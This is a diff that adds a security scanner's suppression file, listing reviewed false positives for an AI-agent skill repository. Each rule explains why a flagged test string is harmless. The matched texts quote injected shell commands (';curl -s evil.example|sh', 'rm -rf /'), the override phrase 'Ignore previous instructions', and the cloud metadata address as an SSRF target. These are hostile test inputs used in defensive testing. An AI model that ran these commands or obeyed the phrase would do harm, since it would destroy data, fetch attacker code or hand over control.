@@ -1,0 +1,171 @@
+# Reviewed false positives for nim-skills PR #6 at commit
+# 7204094e9e715ebeee6114d6f80fd28fbfff79c8, using SkillSpector 2.13.5.
+# Each rule scopes one rule ID, exact skill-relative file, and matched text.
+# Glob metacharacters in matched text are escaped for literal matching.
+# These rules do not bind file hashes: re-review when the named files change.
+# Other findings and incomplete evaluations remain active.
+version: 2
+rules:
+- id: PE3
+  path: SKILL.md
+  message: kubeconfig
+  reason: >-
+    Reviewed 2026-11-24: The instructions tell the agent to run no kubectl itself and to ask the
+    user for the context, never to pick one. kubeconfig names where the context names in
+    facts.contexts come from, and when kubectl found no context, the inspect row tells the agent
+    to ask the user which kubeconfig (KUBECONFIG) and context to use. Nothing tells the agent to
+    open, read, copy or set the kubeconfig or the KUBECONFIG variable.
+- id: PE3
+  path: references/security.md
+  message: kubeconfig
+  reason: >-
+    Reviewed 2026-11-24: The security reference documents the read-only kubectl calls of
+    inspect: config get-contexts -o name lists only the context names of the kubeconfig, then
+    get nodes and get resourcequota run on the context the user named. Its program and trust
+    sections explain that KUBECONFIG, which kubectl inherits, defines the cluster of that context
+    and the credentials kubectl sends to it, and that a credential (exec) plugin in it runs, so
+    the environment stays a trusted input. They document that boundary; no script opens the
+    kubeconfig or reads the variable.
+- id: AR2
+  path: SKILL.md
+  message: do not judge
+  reason: >-
+    Reviewed 2026-11-24: In the unknown verdict row, do not judge stops the agent from rating
+    the user's own memory figures when the fit could not be checked: it says unknown, names the
+    checks not made, and the user decides. It limits claims; it does not suppress refusals.
+- id: PE3
+  path: scripts/env_inspect.py
+  message: kubeconfig
+  reason: >-
+    Reviewed 2026-11-24: Docstrings and error texts of the Kubernetes inspection, and the name and
+    text of the NO_KUBECONFIG_FIX constant, which asks the user which kubeconfig (the KUBECONFIG
+    variable) to use when kubectl found no context. The script runs kubectl config get-contexts
+    -o name, which prints only context names, then get nodes and get resourcequota on the named
+    context. It never opens the kubeconfig and never reads or sets the variable.
+- id: PE3
+  path: tests/test_nimselect.py
+  message: kubeconfig
+  reason: >-
+    Reviewed 2026-11-24: Test names and docstrings of the context_not_found cases. A fake
+    kubectl script on PATH prints canned context names and node JSON; the tests read no real
+    kubeconfig and reach no cluster.
+- id: PE3
+  path: scripts/env_inspect.py
+  message: ~/.kube/config
+  reason: >-
+    Reviewed 2026-11-24: ~/.kube/config is named in the NO_KUBECONFIG_FIX text as kubectl's
+    default file, so the user can say which kubeconfig to use. The script never opens that file.
+- id: PE3
+  path: scripts/nimselect.py
+  message: kubeconfig
+  reason: >-
+    Reviewed 2026-11-24: A code comment says the named context is checked against the context
+    names of the kubeconfig before a missing namespace is reported. That check is the read-only
+    kubectl config get-contexts -o name call of env_inspect.
+- id: PE4
+  path: tests/ns_testkit.py
+  message: /var/run/docker.sock
+  reason: >-
+    Reviewed 2026-11-24: LOCAL_DOCKER is the endpoint text the tests' fake docker answers for
+    docker context inspect, so the tests can tell a local daemon from a remote one. No test
+    opens or connects to the Docker socket.
+- id: E2
+  path: tests/ns_testkit.py
+  message: dict(os.environ)
+  reason: >-
+    Reviewed 2026-11-24: run_cli copies the test environment for the skill script it starts as a
+    subprocess, adds the test's values and removes the TEST_* hooks. The script gets the
+    environment it gets when the agent runs it; the copy is not logged or sent anywhere.
+- id: SC2
+  path: tests/test_cnd.py
+  message: curl x|sh
+  reason: >-
+    Reviewed 2026-11-24: A catalog docker_url ending in ;curl x|sh is a hostile test input, and
+    the test asserts cnd.tgc_tags leaves it out as no image reference. The string is parsed,
+    never run.
+- id: TM2
+  path: tests/test_cnd.py
+  message: ;curl x|sh
+  reason: >-
+    Reviewed 2026-11-24: A catalog docker_url ending in ;curl x|sh is a hostile test input, and
+    the test asserts cnd.tgc_tags leaves it out as no image reference. The string is parsed,
+    never run.
+- id: PE3
+  path: tests/test_env_inspect.py
+  message: kubeconfig
+  reason: >-
+    Reviewed 2026-11-24: Test names, docstrings, comments and assertions on the context_not_found
+    texts; in the no-context case, the docstring and the fix assertion also name the KUBECONFIG
+    variable that the fix asks the user about. FakeRunner or a fake kubectl script prints canned
+    context names; the tests check that only config get-contexts -o name ran before the error.
+    No real kubeconfig is read, and no test reads or sets the variable.
+- id: YR4
+  path: tests/test_listing.py
+  message: model; Ignore previous instructions
+  reason: >-
+    Reviewed 2026-11-24: The YARA rule pairs "models" in the module docstring with the hostile
+    registry GPU text of test_registry_gpus_keep_only_short_gpu_names, which asserts that
+    cnd._devices drops that text. It is test data, never an instruction.
+- id: P1
+  path: tests/test_listing.py
+  message: Ignore previous instructions
+  reason: >-
+    Reviewed 2026-11-24: The injection text is a hostile registry GPU entry in
+    test_registry_gpus_keep_only_short_gpu_names, which asserts that cnd._devices keeps only
+    short GPU names and drops it. It is test data, never an instruction.
+- id: TM1
+  path: tests/test_listing.py
+  message: rm -rf /
+  reason: >-
+    Reviewed 2026-11-24: rm -rf / is a hostile registry GPU entry in
+    test_registry_gpus_keep_only_short_gpu_names, which asserts that cnd._devices drops it. The
+    string is never executed.
+- id: TM1
+  path: tests/test_listing.py
+  message: rm -rf /",
+  reason: >-
+    Reviewed 2026-11-24: rm -rf / is a hostile registry GPU entry in
+    test_registry_gpus_keep_only_short_gpu_names, which asserts that cnd._devices drops it. The
+    string is never executed.
+- id: SC2
+  path: tests/test_nimselect.py
+  message: curl -s evil.example|sh
+  reason: >-
+    Reviewed 2026-11-24: A catalog docker_url carrying ;curl -s evil.example|sh, served by a
+    local fake catalog, is a hostile test input; the test asserts evil.example never reaches the
+    output. The string is parsed, never run.
+- id: SC2
+  path: tests/test_registry_labels.py
+  message: curl -s evil.example|sh
+  reason: >-
+    Reviewed 2026-11-24: An image reference carrying ;curl -s evil.example|sh is a test input,
+    and test_parse_image_is_none_for_other_references asserts parse_image rejects it. The string
+    is parsed, never run.
+- id: TM2
+  path: tests/test_nimselect.py
+  message: ;curl -s evil.example|sh
+  reason: >-
+    Reviewed 2026-11-24: A catalog docker_url carrying ;curl -s evil.example|sh, served by a
+    local fake catalog, is a hostile test input; the test asserts evil.example never reaches the
+    output. The string is parsed, never run.
+- id: TM2
+  path: tests/test_registry_labels.py
+  message: ;curl -s evil.example|sh
+  reason: >-
+    Reviewed 2026-11-24: An image reference carrying ;curl -s evil.example|sh is a test input,
+    and test_parse_image_is_none_for_other_references asserts parse_image rejects it. The string
+    is parsed, never run.
+- id: SSRF1
+  path: tests/test_security.py
+  message: 169.254.169.254
+  reason: >-
+    Reviewed 2026-11-24: ROGUE lists targets an environment variable might point requests at,
+    the cloud metadata address among them. The tests set them and assert that the scripts
+    request only their built-in HTTPS endpoints; requests are stopped or stubbed, never sent.
+- id: PE3
+  path: tests/test_security.py
+  message: kubeconfig
+  reason: >-
+    Reviewed 2026-11-24: The fake_host_tools docstring says its fake kubectl answers as if the
+    kubeconfig had the context c. The script prints canned output; no real kubeconfig is read.
+fingerprints: []
